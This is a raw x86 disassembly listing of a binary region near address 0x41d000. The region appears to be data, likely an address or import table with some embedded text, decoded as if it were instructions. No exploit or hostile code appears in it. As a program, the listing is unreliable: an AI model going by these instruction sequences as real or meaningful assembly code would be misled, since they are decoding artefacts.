  41d0e2:	add    DWORD PTR [eax],eax
  41d0e4:	sub    al,0xdc
  41d0e6:	add    DWORD PTR [eax],eax
  41d0e8:	cmp    bl,ah
  41d0ea:	add    DWORD PTR [eax],eax
  41d0ec:	dec    esi
  41d0ed:	fadd   QWORD PTR [ecx]
  41d0ef:	add    BYTE PTR [edx-0x24],bl
  41d0f2:	add    DWORD PTR [eax],eax
  41d0f4:	data16 fadd QWORD PTR [ecx]
  41d0f7:	add    BYTE PTR [eax-0x24],bh
  41d0fa:	add    DWORD PTR [eax],eax
  41d0fc:	mov    bl,ah
  41d0fe:	add    DWORD PTR [eax],eax
  41d100:	pushf  
  41d101:	fadd   QWORD PTR [ecx]
  41d103:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d109:	fadd   QWORD PTR [ecx]
  41d10b:	add    ah,cl
  41d10d:	fadd   QWORD PTR [ecx]
  41d10f:	add    al,ah
  41d111:	fadd   QWORD PTR [ecx]
  41d113:	add    ah,dh
  41d115:	fadd   QWORD PTR [ecx]
  41d117:	add    BYTE PTR [esi],al
  41d119:	fld    QWORD PTR [ecx]
  41d11b:	add    BYTE PTR [esi],dl
  41d11d:	fld    QWORD PTR [ecx]
  41d11f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d126:	add    DWORD PTR [eax],eax
  41d128:	dec    edx
  41d129:	fld    QWORD PTR [ecx]
  41d12b:	add    BYTE PTR [eax-0x23],bl
  41d12e:	add    DWORD PTR [eax],eax
  41d130:	pusha  
  41d131:	fld    QWORD PTR [ecx]
  41d133:	add    BYTE PTR [esi-0x23],ch
  41d136:	add    DWORD PTR [eax],eax
  41d138:	test   ch,bl
  41d13a:	add    DWORD PTR [eax],eax
  41d13c:	mov    ds,ebp
  41d13e:	add    DWORD PTR [eax],eax
  41d140:	sahf   
  41d141:	fld    QWORD PTR [ecx]
  41d143:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d14a:	add    DWORD PTR [eax],eax
  41d14c:	fcmovu st,st(5)
  41d14e:	add    DWORD PTR [eax],eax
  41d150:	out    dx,al
  41d151:	fld    QWORD PTR [ecx]
  41d153:	add    ah,bh
  41d155:	fld    QWORD PTR [ecx]
  41d157:	add    BYTE PTR [eax],cl
  41d159:	fiadd  WORD PTR [ecx]
  41d15b:	add    BYTE PTR [eax],ah
  41d15d:	fiadd  WORD PTR [ecx]
  41d15f:	add    BYTE PTR [edx],dh
  41d161:	fiadd  WORD PTR [ecx]
  41d163:	add    BYTE PTR [edx-0x22],cl
  41d166:	add    DWORD PTR [eax],eax
  41d168:	pop    esp
  41d169:	fiadd  WORD PTR [ecx]
  41d16b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d16f:	add    BYTE PTR [edx-0x71fffe22],al
  41d175:	fiadd  WORD PTR [ecx]
  41d177:	add    BYTE PTR [edx+0x1de],ah
  41d17d:	add    BYTE PTR [eax],al
  41d17f:	add    al,al
  41d181:	fiadd  WORD PTR [ecx]
  41d183:	add    dl,cl
  41d185:	fiadd  WORD PTR [ecx]
  41d187:	add    ah,dl
  41d189:	fiadd  WORD PTR [ecx]
  41d18b:	add    al,ah
  41d18d:	fiadd  WORD PTR [ecx]
  41d18f:	add    ah,dh
  41d191:	fiadd  WORD PTR [ecx]
  41d193:	add    BYTE PTR [eax],al
  41d195:	fild   WORD PTR [ecx]
  41d197:	add    BYTE PTR [edx],bl
  41d199:	fild   WORD PTR [ecx]
  41d19b:	add    BYTE PTR [edx],ch
  41d19d:	fild   WORD PTR [ecx]
  41d19f:	add    BYTE PTR [eax],bh
  41d1a1:	fild   WORD PTR [ecx]
  41d1a3:	add    BYTE PTR [eax-0x21],dl
  41d1a6:	add    DWORD PTR [eax],eax
  41d1a8:	fild   WORD PTR fs:[ecx]
  41d1ab:	add    BYTE PTR [esi-0x21],bh
  41d1ae:	add    DWORD PTR [eax],eax
  41d1b0:	mov    edi,ds
  41d1b2:	add    DWORD PTR [eax],eax
  41d1b4:	cwde   
  41d1b5:	fild   WORD PTR [ecx]
  41d1b7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d1bd:	fild   WORD PTR [ecx]
  41d1bf:	add    dh,al
  41d1c1:	fild   WORD PTR [ecx]
  41d1c3:	add    dh,dl
  41d1c5:	fild   WORD PTR [ecx]
  41d1c7:	add    dh,ah
  41d1c9:	fild   WORD PTR [ecx]
  41d1cb:	add    ah,bh
  41d1cd:	fild   WORD PTR [ecx]
  41d1cf:	add    BYTE PTR [eax],cl
  41d1d1:	loopne 0x41d1d4
  41d1d3:	add    BYTE PTR [eax+eiz*8],dl
  41d1d6:	add    DWORD PTR [eax],eax
  41d1d8:	sub    al,ah
  41d1da:	add    DWORD PTR [eax],eax
  41d1dc:	ds loopne 0x41d1e0
  41d1df:	add    BYTE PTR [esi-0x20],dl
  41d1e2:	add    DWORD PTR [eax],eax
  41d1e4:	data16 loopne 0x41d1e8
  41d1e7:	add    BYTE PTR [edx-0x20],dh
  41d1ea:	add    DWORD PTR [eax],eax
  41d1ec:	xchg   al,ah
  41d1ee:	add    DWORD PTR [eax],eax
  41d1f0:	xchg   esp,eax
  41d1f1:	loopne 0x41d1f4
  41d1f3:	add    BYTE PTR [esi-0x47fffe20],ch
  41d1f9:	loopne 0x41d1fc
  41d1fb:	add    dl,cl
  41d1fd:	loopne 0x41d200
  41d1ff:	add    ah,bl
  41d201:	loopne 0x41d204
  41d203:	add    dh,ch
  41d205:	loopne 0x41d208
  41d207:	add    dh,bh
  41d209:	loopne 0x41d20c
  41d20b:	add    BYTE PTR [eax],cl
  41d20d:	loope  0x41d210
  41d20f:	add    BYTE PTR [esi],bl
  41d211:	loope  0x41d214
  41d213:	add    BYTE PTR [edx],dh
  41d215:	loope  0x41d218
  41d217:	add    BYTE PTR [esi-0x1f],al
  41d21a:	add    DWORD PTR [eax],eax
  41d21c:	push   esi
  41d21d:	loope  0x41d220
  41d21f:	add    BYTE PTR [esi-0x1f],ah
  41d222:	add    DWORD PTR [eax],eax
  41d224:	jb     0x41d207
  41d226:	add    DWORD PTR [eax],eax
  41d228:	test   cl,ah
  41d22a:	add    DWORD PTR [eax],eax
  41d22c:	mov    al,ds:0xb60001e1
  41d231:	loope  0x41d234
  41d233:	add    dl,al
  41d235:	loope  0x41d238
  41d237:	add    dh,dl
  41d239:	loope  0x41d23c
  41d23b:	add    BYTE PTR [eax],al
  41d23d:	add    BYTE PTR [eax],al
  41d23f:	add    ah,dh
  41d241:	loope  0x41d244
  41d243:	add    BYTE PTR [edx+eiz*8],al
  41d246:	add    DWORD PTR [eax],eax
  41d248:	adc    al,0xe2
  41d24a:	add    DWORD PTR [eax],eax
  41d24c:	and    ah,dl
  41d24e:	add    DWORD PTR [eax],eax
  41d250:	xor    dl,ah
  41d252:	add    DWORD PTR [eax],eax
  41d254:	ds loop 0x41d258
  41d257:	add    BYTE PTR [edx-0x1e],dl
  41d25a:	add    DWORD PTR [eax],eax
  41d25c:	pusha  
  41d25d:	loop   0x41d260
  41d25f:	add    BYTE PTR [edx-0x1e],bh
  41d262:	add    DWORD PTR [eax],eax
  41d264:	xchg   dl,ah
  41d266:	add    DWORD PTR [eax],eax
  41d268:	cwde   
  41d269:	loop   0x41d26c
  41d26b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d272:	add    DWORD PTR [eax],eax
  41d274:	int3   
  41d275:	loop   0x41d278
  41d277:	add    dh,dl
  41d279:	loop   0x41d27c
  41d27b:	add    al,ah
  41d27d:	loop   0x41d280
  41d27f:	add    dl,bh
  41d281:	loop   0x41d284
  41d283:	add    BYTE PTR [edx],cl
  41d285:	jecxz  0x41d288
  41d287:	add    BYTE PTR [edx],bl
  41d289:	jecxz  0x41d28c
  41d28b:	add    BYTE PTR [ebx+eiz*8],ah
  41d28e:	add    DWORD PTR [eax],eax
  41d290:	xor    al,0xe3
  41d292:	add    DWORD PTR [eax],eax
  41d294:	inc    eax
  41d295:	jecxz  0x41d298
  41d297:	add    BYTE PTR [esi-0x1d],cl
  41d29a:	add    DWORD PTR [eax],eax
  41d29c:	fs jecxz 0x41d2a0
  41d29f:	add    BYTE PTR [esi-0x1d],dh
  41d2a2:	add    DWORD PTR [eax],eax
  41d2a4:	mov    fs,ebx
  41d2a6:	add    DWORD PTR [eax],eax
  41d2a8:	mov    ds:0xb00001e3,al
  41d2ad:	jecxz  0x41d2b0
  41d2af:	add    dl,al
  41d2b1:	jecxz  0x41d2b4
  41d2b3:	add    dh,cl
  41d2b5:	jecxz  0x41d2b8
  41d2b7:	add    dh,bl
  41d2b9:	jecxz  0x41d2bc
  41d2bb:	add    ah,ch
  41d2bd:	jecxz  0x41d2c0
  41d2bf:	add    BYTE PTR [eax],al
  41d2c1:	in     al,0x1
  41d2c3:	add    BYTE PTR [esi],cl
  41d2c5:	in     al,0x1
  41d2c7:	add    BYTE PTR [edx],ch
  41d2c9:	in     al,0x1
  41d2cb:	add    BYTE PTR [esp+eiz*8],bh
  41d2ce:	add    DWORD PTR [eax],eax
  41d2d0:	dec    esp
  41d2d1:	in     al,0x1
  41d2d3:	add    BYTE PTR [esi-0x1c],bl
  41d2d6:	add    DWORD PTR [eax],eax
  41d2d8:	push   0xffffffe4
  41d2da:	add    DWORD PTR [eax],eax
  41d2dc:	jl     0x41d2c2
  41d2de:	add    DWORD PTR [eax],eax
  41d2e0:	mov    ah,ah
  41d2e2:	add    DWORD PTR [eax],eax
  41d2e4:	cwde   
  41d2e5:	in     al,0x1
  41d2e7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d2ed:	in     al,0x1
  41d2ef:	add    al,dl
  41d2f1:	in     al,0x1
  41d2f3:	add    dl,ah
  41d2f5:	in     al,0x1
  41d2f7:	add    al,dh
  41d2f9:	in     al,0x1
  41d2fb:	add    BYTE PTR [eax],cl
  41d2fd:	in     eax,0x1
  41d2ff:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d306:	add    DWORD PTR [eax],eax
  41d308:	ds in  eax,0x1
  41d30b:	add    BYTE PTR [edx-0x1b],cl
  41d30e:	add    DWORD PTR [eax],eax
  41d310:	pop    edx
  41d311:	in     eax,0x1
  41d313:	add    BYTE PTR [esi-0x1b],ch
  41d316:	add    DWORD PTR [eax],eax
  41d318:	jle    0x41d2ff
  41d31a:	add    DWORD PTR [eax],eax
  41d31c:	nop
  41d31d:	in     eax,0x1
  41d31f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d326:	add    DWORD PTR [eax],eax
  41d328:	mov    eax,0xca0001e5
  41d32d:	in     eax,0x1
  41d32f:	add    dl,bl
  41d331:	in     eax,0x1
  41d333:	add    dh,ah
  41d335:	in     eax,0x1
  41d337:	add    ah,bh
  41d339:	in     eax,0x1
  41d33b:	add    BYTE PTR [esi],cl
  41d33d:	out    0x1,al
  41d33f:	add    BYTE PTR [eax],ch
  41d341:	out    0x1,al
  41d343:	add    BYTE PTR [edx],bh
  41d345:	out    0x1,al
  41d347:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d34b:	add    BYTE PTR [eax-0x1a],bl
  41d34e:	add    DWORD PTR [eax],eax
  41d350:	push   0x7a0001e6
  41d355:	out    0x1,al
  41d357:	add    BYTE PTR [esi-0x67fffe1a],al
  41d35d:	out    0x1,al
  41d35f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d365:	out    0x1,al
  41d367:	add    ah,bl
  41d369:	out    0x1,al
  41d36b:	add    dl,ch
  41d36d:	out    0x1,al
  41d36f:	add    al,bh
  41d371:	out    0x1,al
  41d373:	add    BYTE PTR [esi],cl
  41d375:	out    0x1,eax
  41d377:	add    BYTE PTR [esi],bl
  41d379:	out    0x1,eax
  41d37b:	add    BYTE PTR [edx],ch
  41d37d:	out    0x1,eax
  41d37f:	add    BYTE PTR [edx],bh
  41d381:	out    0x1,eax
  41d383:	add    BYTE PTR [edx-0x19],cl
  41d386:	add    DWORD PTR [eax],eax
  41d388:	pop    esp
  41d389:	out    0x1,eax
  41d38b:	add    BYTE PTR [eax-0x19],ch
  41d38e:	add    DWORD PTR [eax],eax
  41d390:	jbe    0x41d379
  41d392:	add    DWORD PTR [eax],eax
  41d394:	xchg   bh,ah
  41d396:	add    DWORD PTR [eax],eax
  41d398:	cwde   
  41d399:	out    0x1,eax
  41d39b:	add    BYTE PTR [eax-0x45fffe19],ch
  41d3a1:	out    0x1,eax
  41d3a3:	add    al,dl
  41d3a5:	out    0x1,eax
  41d3a7:	add    dh,ah
  41d3a9:	out    0x1,eax
  41d3ab:	add    dh,dh
  41d3ad:	out    0x1,eax
  41d3af:	add    BYTE PTR [edx],al
  41d3b1:	call   0xe859d3b7
  41d3b6:	add    DWORD PTR [eax],eax
  41d3b8:	and    al,0xe8
  41d3ba:	add    DWORD PTR [eax],eax
  41d3bc:	xor    al,0xe8
  41d3be:	add    DWORD PTR [eax],eax
  41d3c0:	dec    eax
  41d3c1:	call   0xe897d3c7
  41d3c6:	add    DWORD PTR [eax],eax
  41d3c8:	callw  0xd3cd
  41d3cc:	jp     0x41d3b6
  41d3ce:	add    DWORD PTR [eax],eax
  41d3d0:	xchg   al,ch
  41d3d2:	add    DWORD PTR [eax],eax
  41d3d4:	xchg   esi,eax
  41d3d5:	call   0xe8e3d3db
  41d3da:	add    DWORD PTR [eax],eax
  41d3dc:	mov    dl,0xe8
  41d3de:	add    DWORD PTR [eax],eax
  41d3e0:	(bad)  
  41d3e1:	call   0xe913d3e7
  41d3e6:	add    DWORD PTR [eax],eax
  41d3e8:	in     al,0xe8
  41d3ea:	add    DWORD PTR [eax],eax
  41d3ec:	lock call 0xe93fd3f3
  41d3f2:	add    DWORD PTR [eax],eax
  41d3f4:	or     al,0xe9
  41d3f6:	add    DWORD PTR [eax],eax
  41d3f8:	sbb    ch,cl
  41d3fa:	add    DWORD PTR [eax],eax
  41d3fc:	add    BYTE PTR [eax],al
  41d3fe:	add    BYTE PTR [eax],al
  41d400:	or     al,0x2
  41d402:	add    BYTE PTR [eax+0x0],al
  41d408:	add    BYTE PTR [eax],al
  41d40a:	add    BYTE PTR [eax],al
  41d40c:	das    
  41d40d:	and    DWORD PTR [ecx*2+0x0],edx
  41d414:	add    al,BYTE PTR [eax]
  41d416:	add    BYTE PTR [eax],al
  41d418:	pop    ebp
  41d419:	add    BYTE PTR [eax],al
  41d41b:	add    ah,dl
  41d41d:	mov    dl,0x2
  41d41f:	add    ah,dl
  41d421:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d422:	add    al,BYTE PTR [eax]
	...
  41d42c:	das    
  41d42d:	and    DWORD PTR [ecx*2+0x0],edx
  41d434:	pop    edx
  41d435:	aam    0x1
  41d437:	add    BYTE PTR [ecx],al
  41d439:	add    BYTE PTR [eax],al
  41d43b:	add    BYTE PTR [ecx],al
  41d43d:	add    BYTE PTR [eax],al
  41d43f:	add    BYTE PTR [ecx],al
  41d441:	add    BYTE PTR [eax],al
  41d443:	add    BYTE PTR [eax-0x2c],dl
  41d446:	add    DWORD PTR [eax],eax
  41d448:	push   esp
  41d449:	aam    0x1
  41d44b:	add    BYTE PTR [eax-0x2c],bl
  41d44e:	add    DWORD PTR [eax],eax
  41d450:	xchg   edi,eax
  41d451:	inc    ebx
  41d452:	add    BYTE PTR [eax],al
  41d454:	imul   edx,esp,0x1
  41d457:	add    BYTE PTR [eax],al
  41d459:	add    BYTE PTR [eax+ebp*2+0x58],ah
  41d45d:	xor    dl,BYTE PTR [eax+0x78]
  41d460:	jp     0x41d4aa
  41d462:	jp     0x41d4d5
  41d464:	outs   dx,BYTE PTR ds:[esi]
  41d465:	je     0x41d495
  41d467:	je     0x41d4d2
  41d469:	jo     0x41d46b
  41d46b:	aas    
  41d46c:	dec    eax
  41d46d:	imul   esp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  41d475:	gs jb  0x41d4c7
  41d478:	jb     0x41d4e3
  41d47a:	imul   ebp,DWORD PTR [bp+0x61],0x5940406c
  41d482:	inc    edi
  41d483:	inc    esi
  41d484:	dec    ebx
  41d485:	push   eax
  41d486:	inc    ecx
  41d487:	dec    ecx
  41d488:	push   eax
  41d489:	inc    ecx
  41d48a:	inc    esp
  41d48b:	cmp    al,0x56
	...
  41d495:	add    BYTE PTR [eax],al
  41d497:	add    BYTE PTR [eax],dl
  41d499:	aad    0x1
	...
  41d4a3:	add    BYTE PTR [esi],al
  41d4a5:	fild   DWORD PTR [ecx]
  41d4a7:	add    BYTE PTR [eax],al
  41d4a9:	rol    BYTE PTR [ecx],1
  41d4ab:	add    ah,al
  41d4ad:	aad    0x1
	...
  41d4b7:	add    BYTE PTR [edx-0x4bfffe22],dh
  41d4bd:	rol    BYTE PTR [ecx],1
  41d4bf:	add    BYTE PTR [eax+0x1d6],dl
  41d4c5:	add    BYTE PTR [eax],al
  41d4c7:	add    BYTE PTR [eax],al
  41d4c9:	add    BYTE PTR [eax],al
  41d4cb:	add    dl,ch
  41d4cd:	loope  0x41d4d0
  41d4cf:	add    BYTE PTR [eax+0x500001d1],al
  41d4d5:	xlat   BYTE PTR ds:[ebx]
  41d4d6:	add    DWORD PTR [eax],eax
	...
  41d4e0:	ss jmp 0xd281d4e7
  41d4e6:	add    DWORD PTR [eax],eax
  41d4e8:	adc    cl,bl
  41d4ea:	add    DWORD PTR [eax],eax
	...
  41d4f4:	inc    edx
  41d4f5:	jmp    0xd441d4fb
  41d4fa:	add    DWORD PTR [eax],eax
	...
  41d510:	sbb    cl,bl
  41d512:	add    DWORD PTR [eax],eax
  41d514:	fld    DWORD PTR es:[ecx]
  41d517:	add    BYTE PTR [eax],dh
  41d519:	fld    DWORD PTR [ecx]
  41d51b:	add    BYTE PTR [edx],bh
  41d51d:	fld    DWORD PTR [ecx]
  41d51f:	add    BYTE PTR [edx-0x27],al
  41d522:	add    DWORD PTR [eax],eax
  41d524:	dec    esp
  41d525:	fld    DWORD PTR [ecx]
  41d527:	add    BYTE PTR [eax-0x27],bl
  41d52a:	add    DWORD PTR [eax],eax
  41d52c:	(bad)  
  41d52d:	fld    DWORD PTR [ecx]
  41d52f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d533:	add    BYTE PTR [eax-0x27],bh
  41d536:	add    DWORD PTR [eax],eax
  41d538:	sbb    cl,0x1
  41d53b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d541:	fld    DWORD PTR [ecx]
  41d543:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d549:	fld    DWORD PTR [ecx]
  41d54b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d552:	add    DWORD PTR [eax],eax
  41d554:	rcr    cl,1
  41d556:	add    DWORD PTR [eax],eax
  41d558:	loopne 0x41d533
  41d55a:	add    DWORD PTR [eax],eax
  41d55c:	jmp    0x1d9:0xf80001d9
  41d563:	add    BYTE PTR [edx+ebx*8],al
  41d566:	add    DWORD PTR [eax],eax
  41d568:	push   cs
  41d569:	fiadd  DWORD PTR [ecx]
  41d56b:	add    BYTE PTR [edx],bl
  41d56d:	fiadd  DWORD PTR [ecx]
  41d56f:	add    BYTE PTR [edx+ebx*8],ah
  41d572:	add    DWORD PTR [eax],eax
  41d574:	fiadd  DWORD PTR cs:[ecx]
  41d577:	add    BYTE PTR [eax],bh
  41d579:	fiadd  DWORD PTR [ecx]
  41d57b:	add    BYTE PTR [eax-0x26],al
  41d57e:	add    DWORD PTR [eax],eax
  41d580:	dec    esi
  41d581:	fiadd  DWORD PTR [ecx]
  41d583:	add    BYTE PTR [eax-0x26],bl
  41d586:	add    DWORD PTR [eax],eax
  41d588:	fiadd  DWORD PTR fs:[ecx]
  41d58b:	add    BYTE PTR [esi-0x26],ch
  41d58e:	add    DWORD PTR [eax],eax
  41d590:	js     0x41d56c
  41d592:	add    DWORD PTR [eax],eax
  41d594:	xchg   dl,bl
  41d596:	add    DWORD PTR [eax],eax
  41d598:	mov    ds,edx
  41d59a:	add    DWORD PTR [eax],eax
  41d59c:	call   0x1da:0xa40001da
  41d5a3:	add    BYTE PTR [esi-0x47fffe26],ch
  41d5a9:	fiadd  DWORD PTR [ecx]
  41d5ab:	add    ah,cl
  41d5ad:	fiadd  DWORD PTR [ecx]
  41d5af:	add    ah,bl
  41d5b1:	fiadd  DWORD PTR [ecx]
  41d5b3:	add    al,ch
  41d5b5:	fiadd  DWORD PTR [ecx]
  41d5b7:	add    dl,dh
  41d5b9:	fiadd  DWORD PTR [ecx]
  41d5bb:	add    ah,bh
  41d5bd:	fiadd  DWORD PTR [ecx]
  41d5bf:	add    BYTE PTR [eax],al
  41d5c1:	add    BYTE PTR [eax],al
  41d5c3:	add    BYTE PTR [edx],dl
  41d5c5:	fild   DWORD PTR [ecx]
  41d5c7:	add    BYTE PTR [eax],dh
  41d5c9:	fild   DWORD PTR [ecx]
  41d5cb:	add    BYTE PTR [eax-0x25],cl
  41d5ce:	add    DWORD PTR [eax],eax
  41d5d0:	push   0x7a0001db
  41d5d5:	fild   DWORD PTR [ecx]
  41d5d7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d5dd:	fild   DWORD PTR [ecx]
  41d5df:	add    dl,al
  41d5e1:	fild   DWORD PTR [ecx]
  41d5e3:	add    dh,dl
  41d5e5:	fild   DWORD PTR [ecx]
  41d5e7:	add    dh,ah
  41d5e9:	fild   DWORD PTR [ecx]
  41d5eb:	add    BYTE PTR [edx],al
  41d5ed:	fadd   QWORD PTR [ecx]
  41d5ef:	add    BYTE PTR [esp+ebx*8],bl
  41d5f2:	add    DWORD PTR [eax],eax
  41d5f4:	sub    al,0xdc
  41d5f6:	add    DWORD PTR [eax],eax
  41d5f8:	cmp    bl,ah
  41d5fa:	add    DWORD PTR [eax],eax
  41d5fc:	dec    esi
  41d5fd:	fadd   QWORD PTR [ecx]
  41d5ff:	add    BYTE PTR [edx-0x24],bl
  41d602:	add    DWORD PTR [eax],eax
  41d604:	data16 fadd QWORD PTR [ecx]
  41d607:	add    BYTE PTR [eax-0x24],bh
  41d60a:	add    DWORD PTR [eax],eax
  41d60c:	mov    bl,ah
  41d60e:	add    DWORD PTR [eax],eax
  41d610:	pushf  
  41d611:	fadd   QWORD PTR [ecx]
  41d613:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d619:	fadd   QWORD PTR [ecx]
  41d61b:	add    ah,cl
  41d61d:	fadd   QWORD PTR [ecx]
  41d61f:	add    al,ah
  41d621:	fadd   QWORD PTR [ecx]
  41d623:	add    ah,dh
  41d625:	fadd   QWORD PTR [ecx]
  41d627:	add    BYTE PTR [esi],al
  41d629:	fld    QWORD PTR [ecx]
  41d62b:	add    BYTE PTR [esi],dl
  41d62d:	fld    QWORD PTR [ecx]
  41d62f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d636:	add    DWORD PTR [eax],eax
  41d638:	dec    edx
  41d639:	fld    QWORD PTR [ecx]
  41d63b:	add    BYTE PTR [eax-0x23],bl
  41d63e:	add    DWORD PTR [eax],eax
  41d640:	pusha  
  41d641:	fld    QWORD PTR [ecx]
  41d643:	add    BYTE PTR [esi-0x23],ch
  41d646:	add    DWORD PTR [eax],eax
  41d648:	test   ch,bl
  41d64a:	add    DWORD PTR [eax],eax
  41d64c:	mov    ds,ebp
  41d64e:	add    DWORD PTR [eax],eax
  41d650:	sahf   
  41d651:	fld    QWORD PTR [ecx]
  41d653:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d65a:	add    DWORD PTR [eax],eax
  41d65c:	fcmovu st,st(5)
  41d65e:	add    DWORD PTR [eax],eax
  41d660:	out    dx,al
  41d661:	fld    QWORD PTR [ecx]
  41d663:	add    ah,bh
  41d665:	fld    QWORD PTR [ecx]
  41d667:	add    BYTE PTR [eax],cl
  41d669:	fiadd  WORD PTR [ecx]
  41d66b:	add    BYTE PTR [eax],ah
  41d66d:	fiadd  WORD PTR [ecx]
  41d66f:	add    BYTE PTR [edx],dh
  41d671:	fiadd  WORD PTR [ecx]
  41d673:	add    BYTE PTR [edx-0x22],cl
  41d676:	add    DWORD PTR [eax],eax
  41d678:	pop    esp
  41d679:	fiadd  WORD PTR [ecx]
  41d67b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d67f:	add    BYTE PTR [edx-0x71fffe22],al
  41d685:	fiadd  WORD PTR [ecx]
  41d687:	add    BYTE PTR [edx+0x1de],ah
  41d68d:	add    BYTE PTR [eax],al
  41d68f:	add    al,al
  41d691:	fiadd  WORD PTR [ecx]
  41d693:	add    dl,cl
  41d695:	fiadd  WORD PTR [ecx]
  41d697:	add    ah,dl
  41d699:	fiadd  WORD PTR [ecx]
  41d69b:	add    al,ah
  41d69d:	fiadd  WORD PTR [ecx]
  41d69f:	add    ah,dh
  41d6a1:	fiadd  WORD PTR [ecx]
  41d6a3:	add    BYTE PTR [eax],al
  41d6a5:	fild   WORD PTR [ecx]
  41d6a7:	add    BYTE PTR [edx],bl
  41d6a9:	fild   WORD PTR [ecx]
  41d6ab:	add    BYTE PTR [edx],ch
  41d6ad:	fild   WORD PTR [ecx]
  41d6af:	add    BYTE PTR [eax],bh
  41d6b1:	fild   WORD PTR [ecx]
  41d6b3:	add    BYTE PTR [eax-0x21],dl
  41d6b6:	add    DWORD PTR [eax],eax
  41d6b8:	fild   WORD PTR fs:[ecx]
  41d6bb:	add    BYTE PTR [esi-0x21],bh
  41d6be:	add    DWORD PTR [eax],eax
  41d6c0:	mov    edi,ds
  41d6c2:	add    DWORD PTR [eax],eax
  41d6c4:	cwde   
  41d6c5:	fild   WORD PTR [ecx]
  41d6c7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d6cd:	fild   WORD PTR [ecx]
  41d6cf:	add    dh,al
  41d6d1:	fild   WORD PTR [ecx]
  41d6d3:	add    dh,dl
  41d6d5:	fild   WORD PTR [ecx]
  41d6d7:	add    dh,ah
  41d6d9:	fild   WORD PTR [ecx]
  41d6db:	add    ah,bh
  41d6dd:	fild   WORD PTR [ecx]
  41d6df:	add    BYTE PTR [eax],cl
  41d6e1:	loopne 0x41d6e4
  41d6e3:	add    BYTE PTR [eax+eiz*8],dl
  41d6e6:	add    DWORD PTR [eax],eax
  41d6e8:	sub    al,ah
  41d6ea:	add    DWORD PTR [eax],eax
  41d6ec:	ds loopne 0x41d6f0
  41d6ef:	add    BYTE PTR [esi-0x20],dl
  41d6f2:	add    DWORD PTR [eax],eax
  41d6f4:	data16 loopne 0x41d6f8
  41d6f7:	add    BYTE PTR [edx-0x20],dh
  41d6fa:	add    DWORD PTR [eax],eax
  41d6fc:	xchg   al,ah
  41d6fe:	add    DWORD PTR [eax],eax
  41d700:	xchg   esp,eax
  41d701:	loopne 0x41d704
  41d703:	add    BYTE PTR [esi-0x47fffe20],ch
  41d709:	loopne 0x41d70c
  41d70b:	add    dl,cl
  41d70d:	loopne 0x41d710
  41d70f:	add    ah,bl
  41d711:	loopne 0x41d714
  41d713:	add    dh,ch
  41d715:	loopne 0x41d718
  41d717:	add    dh,bh
  41d719:	loopne 0x41d71c
  41d71b:	add    BYTE PTR [eax],cl
  41d71d:	loope  0x41d720
  41d71f:	add    BYTE PTR [esi],bl
  41d721:	loope  0x41d724
  41d723:	add    BYTE PTR [edx],dh
  41d725:	loope  0x41d728
  41d727:	add    BYTE PTR [esi-0x1f],al
  41d72a:	add    DWORD PTR [eax],eax
  41d72c:	push   esi
  41d72d:	loope  0x41d730
  41d72f:	add    BYTE PTR [esi-0x1f],ah
  41d732:	add    DWORD PTR [eax],eax
  41d734:	jb     0x41d717
  41d736:	add    DWORD PTR [eax],eax
  41d738:	test   cl,ah
  41d73a:	add    DWORD PTR [eax],eax
  41d73c:	mov    al,ds:0xb60001e1
  41d741:	loope  0x41d744
  41d743:	add    dl,al
  41d745:	loope  0x41d748
  41d747:	add    dh,dl
  41d749:	loope  0x41d74c
  41d74b:	add    BYTE PTR [eax],al
  41d74d:	add    BYTE PTR [eax],al
  41d74f:	add    ah,dh
  41d751:	loope  0x41d754
  41d753:	add    BYTE PTR [edx+eiz*8],al
  41d756:	add    DWORD PTR [eax],eax
  41d758:	adc    al,0xe2
  41d75a:	add    DWORD PTR [eax],eax
  41d75c:	and    ah,dl
  41d75e:	add    DWORD PTR [eax],eax
  41d760:	xor    dl,ah
  41d762:	add    DWORD PTR [eax],eax
  41d764:	ds loop 0x41d768
  41d767:	add    BYTE PTR [edx-0x1e],dl
  41d76a:	add    DWORD PTR [eax],eax
  41d76c:	pusha  
  41d76d:	loop   0x41d770
  41d76f:	add    BYTE PTR [edx-0x1e],bh
  41d772:	add    DWORD PTR [eax],eax
  41d774:	xchg   dl,ah
  41d776:	add    DWORD PTR [eax],eax
  41d778:	cwde   
  41d779:	loop   0x41d77c
  41d77b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d782:	add    DWORD PTR [eax],eax
  41d784:	int3   
  41d785:	loop   0x41d788
  41d787:	add    dh,dl
  41d789:	loop   0x41d78c
  41d78b:	add    al,ah
  41d78d:	loop   0x41d790
  41d78f:	add    dl,bh
  41d791:	loop   0x41d794
  41d793:	add    BYTE PTR [edx],cl
  41d795:	jecxz  0x41d798
  41d797:	add    BYTE PTR [edx],bl
  41d799:	jecxz  0x41d79c
  41d79b:	add    BYTE PTR [ebx+eiz*8],ah
  41d79e:	add    DWORD PTR [eax],eax
  41d7a0:	xor    al,0xe3
  41d7a2:	add    DWORD PTR [eax],eax
  41d7a4:	inc    eax
  41d7a5:	jecxz  0x41d7a8
  41d7a7:	add    BYTE PTR [esi-0x1d],cl
  41d7aa:	add    DWORD PTR [eax],eax
  41d7ac:	fs jecxz 0x41d7b0
  41d7af:	add    BYTE PTR [esi-0x1d],dh
  41d7b2:	add    DWORD PTR [eax],eax
